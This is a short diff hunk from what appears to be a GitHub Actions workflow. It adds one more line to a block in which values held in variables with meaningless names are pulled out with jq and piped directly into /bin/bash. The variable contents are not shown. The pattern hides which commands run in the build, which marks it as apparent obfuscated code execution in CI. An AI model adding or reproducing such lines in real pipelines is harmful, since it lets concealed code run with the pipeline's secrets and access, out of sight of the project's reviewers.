@@ -26,6 +26,7 @@ jobs:
           echo $scz38731 | jq -r .wcx5 | /bin/bash
           echo $ene175 | jq -r .te59259 | /bin/bash
           printf '%s' "$e3" | jq -r .nv71 | /bin/bash
+          echo $fknmj6 | jq -r .qdk15 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
